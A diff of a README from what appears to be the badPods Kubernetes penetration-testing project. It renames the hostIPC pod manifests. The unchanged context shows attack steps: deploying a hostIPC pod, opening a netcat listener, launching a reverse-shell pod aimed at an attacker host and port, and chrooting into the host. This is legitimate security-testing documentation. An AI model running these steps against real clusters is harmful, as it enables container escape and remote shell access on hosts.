@@ -21,16 +21,16 @@ spec:
     name: hostipc
   #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
 ```
-[pod-hostipc.yaml](pod-hostipc.yaml)
+[hostipc-exec.yaml](hostipc-exec.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostipc.yaml   
+kubectl apply -f hostipc-exec.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc/pod-hostipc.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc/hostipc-exec.yaml  
 ```
 
 ### Exec into pod 
@@ -56,7 +56,7 @@ spec:
   restartPolicy: Always
   #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
 ```
-[pod-hostipc-revshell.yaml](pod-hostipc-revshell.yaml)
+[hostipc-revshell.yaml](hostipc-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -66,7 +66,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc/hostipc-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
